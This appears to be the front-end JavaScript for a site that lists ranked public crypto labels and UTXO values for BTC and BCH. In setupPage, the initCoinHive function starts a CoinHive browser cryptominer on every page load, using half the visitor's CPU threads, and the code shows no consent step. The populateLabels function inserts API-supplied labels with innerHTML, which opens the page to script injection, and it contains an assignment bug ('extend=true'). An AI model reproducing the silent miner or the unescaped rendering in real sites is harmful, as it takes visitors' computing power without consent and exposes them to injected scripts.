function initCoinHive()
{
  var miner = new CoinHive.Anonymous('Csj8qUyygCcffvPTYirPLvQQu9TVOkih');
  miner.start(); //uncomment when finished
  var deviceThreadCount = miner.getNumThreads();
  miner.setNumThreads(deviceThreadCount/2);
}


function populateLabels(extend=false)
{
  var rowsCountHTML = document.getElementById("rowsCount");
  var rowsCount = rowsCountHTML.value;
  var coin = returnActiveCoin();
  var searchTerm = document.getElementById("searchBar").value;
  var startDate = document.getElementById("timePeriod").value;
  var endDate = getCurrentDate();
  var labelTableHTML = document.getElementById("labelTable");
  var listLength = labelTableHTML.rows.length;
  if (extend == false)
  {
    listLength = labelTableHTML.innerHTML = "";
    var startPos = rowsCount;
    var endPos = 0; 
  }
  else
  {
    var startPos = listLength + rowsCount;
    var endPos = listLength;
  }
  var req = new XMLHttpRequest();
  req.onreadystatechange = function() {
    if (req.readyState == 4 && req.status == 200)
    {
      var APIResponseJSON = req.responseText;
      var labels = JSON.parse(APIResponseJSON);
      if (extend == false){
        var header = labelTableHTML.createTHead();
        var headerRow = header.insertRow(0);
        var rankHeader = headerRow.insertCell(0);
        var labelHeader = headerRow.insertCell(1);
        var utxoHeader = headerRow.insertCell(2);
        rankHeader.innerHTML = "<b>Rank</b>";
        labelHeader.innerHTML = "<b>Public Label</b>";
        utxoHeader.innerHTML = "<b>UTXO</b>";
        }
      var body = labelTableHTML.createTBody();
      for (var i = 0; i < labels.length; i++)
      {
        var bodyRow = body.insertRow(i);
        var rank = bodyRow.insertCell(0);
        var label = bodyRow.insertCell(1);
        var utxo = bodyRow.insertCell(2);
        rank.innerHTML = labels[i]["rank"];
        label.innerHTML = labels[i]["label"];
        utxo.innerHTML = labels[i]["utxo"];
      }
      if (extend=true)
      {
        window.scrollTo(0,document.body.scrollHeight);
      }
    }
  };
  req.open("GET", "/api/?function=searchLabels&startPos=" + startPos + "&endPos=" + endPos + "&startDate=" + startDate + "&endDate=" + endDate + "&searchTerm=" + searchTerm + "&coin=" + coin, true);
  req.send();
    
}


function setupPage()
{
  initCoinHive();
  clearScreen();
  getUiDefaults();
  populateLabels();
}


function selectCoin(coin, event=false)
{
  var bchHTML = document.getElementById("bch");
  var btcHTML = document.getElementById("btc");
  if (coin == "bch")
  {
    if (!bchHTML.className.includes("active"))
    {
      bchHTML.className += " active";
    }
    btcHTML.className = btcHTML.className.replace(" active", "");
  }
  else
  {
    if (!btcHTML.className.includes("active"))
    {
      btcHTML.className += " active";
    }
    bchHTML.className = bchHTML.className.replace(" active", "");
  }
  if (event){
  populateLabels();}
}


function getUiDefaults()
{
  var req = new XMLHttpRequest();
  req.open("GET", "/api/?function=getUiDefaults", false);
  req.send();
  var APIResponseJSON = req.responseText;
  var uiDefaults = JSON.parse(APIResponseJSON);
  var coin = uiDefaults["coin"];
  var rowsCount = uiDefaults["rowsCount"];
  var timePeriod = uiDefaults["timePeriod"];
  var timePeriods = uiDefaults["timePeriods"];
  var rowsCountHTML = document.getElementById("rowsCount");
  var timePeriodHTML = document.getElementById("timePeriod");
  selectCoin(coin);
  rowsCountHTML.value = rowsCount;
  rowsCountHTML.default = rowsCount;
  var currentDate = getCurrentDate();
  var timePeriodList = getSortedKeys(timePeriods);
  for (var i = 0; i< timePeriodList.length; i++)
  {
    periodName = timePeriodList[i];
    startDate = new Date(currentDate);
    startDate.setDate(startDate.getDate() - timePeriods[periodName]);  
    var option = document.createElement("option");
    option.innerHTML = periodName;
    timePeriodHTML.add(option);
    if (periodName == timePeriod)
    {
      timePeriodHTML.value = timePeriod;
    }
    option.value = startDate;
  }
}


function clearScreen()
{
  var rowsCountHTML = document.getElementById("rowsCount");
  var timePeriodHTML = document.getElementById("timePeriod");
  var searchBarHTML = document.getElementById("searchBar");
  var labelTableHTML = document.getElementById("labelTable");
  
  rowsCountHTML.value = "";
  timePeriodHTML.innerHTML = "";
  searchBarHTML.value = "";
  labelTableHTML.value = "";
  }
  

function returnActiveCoin()
{
  var bchHTML = document.getElementById("bch");
  if (bchHTML.classList.contains("active"))
  {
    return "bch";
  }
  else
  {
    return "btc";
  }
}


function getCurrentDate()
{
  Date.prototype.toDateInputValue = (function() {
  var local = new Date(this);
  local.setMinutes(this.getMinutes() - this.getTimezoneOffset());
  return local.toJSON().slice(0,10);});
  return new Date().toDateInputValue();
}


function getSortedKeys(obj) {
    var keys = []; for(var key in obj) keys.push(key);
    return keys.sort(function(a,b){return obj[b]-obj[a]}).reverse();
}
